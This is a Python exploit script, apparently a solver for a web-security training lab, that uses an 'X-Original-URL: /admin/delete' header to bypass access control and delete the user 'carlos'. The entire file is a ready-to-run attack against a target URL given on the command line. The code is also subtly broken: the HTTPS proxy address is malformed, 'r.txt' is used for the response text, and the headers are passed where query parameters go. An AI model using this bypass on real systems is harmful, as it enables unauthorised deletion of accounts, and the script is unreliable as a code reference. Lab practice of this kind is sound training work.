import requests
import sys
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080','https': 'https://127.0.0:8080'}

def delete_user(s,url):
    delete_carlos_user_url = url + "/?username=carlos"
    headers = {"X-Original-URL":"/admin/delete"}
    r = s.get(delete_carlos_user_url, headers,verify=False,proxies=proxies)
    
    #verify if the user was deleted
    r= s.get(url,verify=False,proxies=proxies)
    res = r.txt
    if "Congratulations,you solve the lab!" in res:
        print("(+)Successfully deleted the carlos user.")
    else:
        print("(-)Failed to delete the carlos user.")
        
def main():
    if len(sys.argv)!=2:#if user given  wrong credentials
        print("(+)usage: %s <url>"%sys.argv[0])
        print("(+)Example: %s www.example.com"% sys.argv[0])
        sys.exit(-1)
        
        
    s = requests.Session()
    url = sys.argv[1]
    delete_user(s,url)
        
if __name__=='__main__':
    main()